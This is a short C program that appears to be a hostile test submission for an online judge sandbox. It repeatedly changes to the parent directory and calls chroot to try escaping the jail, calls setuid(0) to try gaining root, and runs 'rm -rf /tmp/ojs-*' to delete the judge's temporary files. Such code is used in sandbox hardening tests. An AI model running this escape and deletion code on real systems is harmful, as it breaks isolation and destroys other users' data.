#include <unistd.h>

int main(){
	// pid_t child = fork();
	for (int i = 0; i < 1024; i++)
		chdir("..");
	chroot("."); // try escaping chroot environment
	setuid(0); // try becoming root user
	system("rm -rf /tmp/ojs-*"); // try removing all ojs files
	return 0;
}
